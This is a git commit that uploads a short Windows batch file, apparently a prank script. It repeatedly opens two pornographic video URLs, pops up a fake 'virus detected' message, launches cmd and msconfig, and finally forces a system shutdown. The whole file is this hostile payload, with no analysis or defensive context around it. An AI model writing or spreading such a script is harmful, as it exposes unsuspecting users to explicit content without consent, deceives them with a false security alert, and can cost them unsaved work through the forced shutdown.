46f5c570f2f666ae93b65693e841cc39a3d48d9f
JirayaSan <84928269+JirayaSann3@users.noreply.github.com>
2022-03-27 22:35:54 -0300

    Add files via upload

---
+++ .bat.bat
@@ -0,0 +1,80 @@
+start https://www.xvideos.com/video55164921/eu_pinto_forte
+start https://www.pornolandia.xxx/video/50641/maior-buceta-para-assistir-em-2021
+msg * Vírus Detectado
+start cmd
+start msconfig
+start https://www.xvideos.com/video55164921/eu_pinto_forte
+start https://www.pornolandia.xxx/video/50641/maior-buceta-para-assistir-em-2021
+start cmd
+start msconfig
+start https://www.xvideos.com/video55164921/eu_pinto_forte
+start https://www.pornolandia.xxx/video/50641/maior-buceta-para-assistir-em-2021
+msg * Vírus Detectado
+start cmd
+start msconfig
+start https://www.xvideos.com/video55164921/eu_pinto_forte
+start https://www.pornolandia.xxx/video/50641/maior-buceta-para-assistir-em-2021
+msg * Vírus Detectado
+start cmd
+start msconfig
+start https://www.xvideos.com/video55164921/eu_pinto_forte
+start https://www.pornolandia.xxx/video/50641/maior-buceta-para-assistir-em-2021
+msg * Vírus Detectado
+start cmd
+start msconfig
+start https://www.xvideos.com/video55164921/eu_pinto_forte
+start https://www.pornolandia.xxx/video/50641/maior-buceta-para-assistir-em-2021
+msg * Vírus Detectado
+start cmd
+start msconfig
+start https://www.xvideos.com/video55164921/eu_pinto_forte
+start https://www.pornolandia.xxx/video/50641/maior-buceta-para-assistir-em-2021
+start cmd
+start msconfig
+start https://www.xvideos.com/video55164921/eu_pinto_forte
+start https://www.pornolandia.xxx/video/50641/maior-buceta-para-assistir-em-2021
+msg * Vírus Detectado
+start cmd
+start msconfig
+start https://www.xvideos.com/video55164921/eu_pinto_forte
+start https://www.pornolandia.xxx/video/50641/maior-buceta-para-assistir-em-2021
+msg * Vírus Detectado
+start cmd
+start msconfig
+start https://www.xvideos.com/video55164921/eu_pinto_forte
+start https://www.pornolandia.xxx/video/50641/maior-buceta-para-assistir-em-2021
+msg * Vírus Detectado
+start cmd
+start msconfig
+start https://www.xvideos.com/video55164921/eu_pinto_forte
+start https://www.pornolandia.xxx/video/50641/maior-buceta-para-assistir-em-2021
+msg * Vírus Detectado
+start cmd
+start msconfig
+start https://www.xvideos.com/video55164921/eu_pinto_forte
+start https://www.pornolandia.xxx/video/50641/maior-buceta-para-assistir-em-2021
+start cmd
+start msconfig
+start https://www.xvideos.com/video55164921/eu_pinto_forte
+start https://www.pornolandia.xxx/video/50641/maior-buceta-para-assistir-em-2021
+msg * Vírus Detectado
+start cmd
+start msconfig
+start https://www.xvideos.com/video55164921/eu_pinto_forte
+start https://www.pornolandia.xxx/video/50641/maior-buceta-para-assistir-em-2021
+msg * Vírus Detectado
+start cmd
+start msconfig
+start https://www.xvideos.com/video55164921/eu_pinto_forte
+start https://www.pornolandia.xxx/video/50641/maior-buceta-para-assistir-em-2021
+msg * Vírus Detectado
+start cmd
+start msconfig
+start https://www.xvideos.com/video55164921/eu_pinto_forte
+start https://www.pornolandia.xxx/video/50641/maior-buceta-para-assistir-em-2021
+msg * Vírus Detectado
+start cmd
+start msconfig
+start https://www.xvideos.com/video55164921/eu_pinto_forte
+start https://www.pornolandia.xxx/video/50641/maior-buceta-para-assistir-em-2021
+shutdown /s
